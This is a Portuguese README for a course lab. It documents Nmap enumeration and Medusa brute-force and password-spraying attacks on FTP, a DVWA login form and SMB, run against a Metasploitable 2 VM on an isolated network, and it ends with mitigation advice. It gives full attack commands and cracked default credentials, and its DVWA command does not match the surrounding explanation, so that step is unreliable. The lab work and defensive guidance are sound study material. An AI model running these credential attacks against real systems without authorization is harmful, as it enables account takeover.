# Ataques de Força Bruta com Medusa e Kali Linux

Projeto prático do desafio de **Cybersecurity da DIO**. O objetivo é simular, em um laboratório isolado e controlado, ataques de **força bruta** contra serviços vulneráveis usando o **Kali Linux** e a ferramenta **Medusa**, e documentar os testes e as medidas de mitigação.

> ⚠️ **Uso exclusivamente educacional.** Todos os testes foram feitos em ambiente próprio, isolado (rede host-only no VirtualBox), com máquinas que eu mesmo configurei. Nunca aplique estas técnicas em sistemas sem autorização — isso é crime (Lei 12.737/2012).

---

## Ambiente do laboratório

Duas máquinas virtuais no **VirtualBox**, em **rede interna host-only** (sem acesso à internet):

- **Kali Linux** (atacante) — IP `192.168.56.102`
- **Metasploitable 2** (alvo vulnerável) — IP `192.168.56.101`

A Metasploitable 2 hospeda os serviços que foram atacados (FTP, DVWA no Apache, e SMB/Samba).

---

## 1. Descoberta e enumeração com Nmap

Primeiro descobri os hosts ativos na rede host-only:

```bash
sudo nmap -sn 192.168.56.0/24
```

O alvo (Metasploitable 2) apareceu como `192.168.56.101`.

Depois enumerei os serviços e versões do alvo:

```bash
nmap -sV -p 21,22,80,139,445,3306 192.168.56.101
```

Resultado:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

Com isso identifiquei os três serviços que seriam alvo dos ataques: **FTP (21)**, **HTTP/DVWA (80)** e **SMB (139/445)**.

---

## 2. Cenário 1 — Força bruta em FTP

Usei o Medusa com as wordlists `users.txt` e `pass.txt` contra o serviço FTP:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4
```

- `-h` → host alvo
- `-U` / `-P` → arquivos de usuários e de senhas
- `-M ftp` → módulo FTP
- `-t 4` → 4 tentativas em paralelo

**Resultado:** credencial encontrada.

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso

Confirmei que a credencial realmente funciona conectando no FTP:

```bash
ftp 192.168.56.101
# usuário: msfadmin / senha: msfadmin
230 Login successful.
ftp> pwd
/home/msfadmin
```

---

## 3. Cenário 2 — Força bruta em formulário web (DVWA)

O alvo é o módulo **Brute Force** da DVWA (`/dvwa/vulnerabilities/brute/`), rodando no Apache do Metasploitable.

### Preparação

1. Acessei `http://192.168.56.101/dvwa/` e fiz login (`admin` / `password`).
2. Em **DVWA Security**, deixei o nível em **Low**.

### Ataque com Medusa

O módulo `web-form` do Medusa usa os campos com valores vazios (ele preenche com `-u`/`-P`) e precisa do cookie de sessão via `CUSTOM-HEADER`:

```bash
medusa -h 192.168.56.101 -u admin -P pass.txt -M http \
  -m PAGE:"/dvwa/login.php" \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m "FAIL=Login failed"
```

- `PAGE` → caminho da página alvo
- `FORM:` → os campos do formulário
- `FAIL` → texto que a DVWA mostra quando a senha está errada (se não aparecer, é sucesso)

**Resultado:** a credencial válida encontrada é `admin` / `password`.

---

## 4. Cenário 3 — Password spraying em SMB

**Password spraying** = testar poucas senhas contra vários usuários, para não disparar bloqueios por tentativas.

### Enumeração dos usuários

Antes do ataque, enumerei os usuários do SMB com o **enum4linux**:

```bash
enum4linux -U 192.168.56.101
```

A partir da lista de usuários retornada, montei o arquivo `smb_users.txt` com os alvos (`user`, `msfadmin`, `root`).

### Ataque com Medusa (módulo smbnt)

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 1 -f -v 6
```

- `-M smbnt` → módulo SMB/Windows
- `-t 1` → uma tentativa por vez (ritmo lento, estilo spraying)
- `-f` → para no primeiro acesso válido

**Resultado:** acesso encontrado com permissão de administrador no compartilhamento.

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

---

## Arquivos do repositório

```
.
├── README.md
├── wordlists/
│   ├── users.txt          # usuários usados no FTP
│   ├── pass.txt           # senhas usadas no FTP
│   ├── smb_users.txt      # usuários do spray SMB
│   └── senhas_spray.txt   # senhas do spray SMB
└── images/                # prints das evidências
```

---

## Recomendações de mitigação

Para cada serviço testado, as defesas recomendadas:

**Geral (todos os serviços)**
- Usar senhas fortes e únicas; proibir senhas comuns.
- Bloqueio de conta (lockout) após várias tentativas falhas.
- Limitar a taxa de tentativas (rate limiting) e monitorar falhas de login.
- Habilitar autenticação multifator (MFA) sempre que possível.
- Manter os serviços atualizados e desabilitar os que não são usados.

**FTP**
- Trocar FTP por SFTP/FTPS (o FTP envia a senha em texto puro).
- Desabilitar login anônimo e restringir acesso por firewall.

**Formulário web (DVWA)**
- CAPTCHA e limite de tentativas por IP/sessão.
- Tokens anti-CSRF e cookies de sessão seguros.
- Atrasos progressivos após falhas e uso de um WAF.

**SMB**
- Políticas de lockout para frear o password spraying.
- Desabilitar SMBv1 e exigir assinatura SMB.
- Restringir a enumeração de usuários e o acesso por firewall.

**Ferramentas úteis:** `fail2ban` (bane IPs com muitas falhas) e firewall (`ufw`/`iptables`).
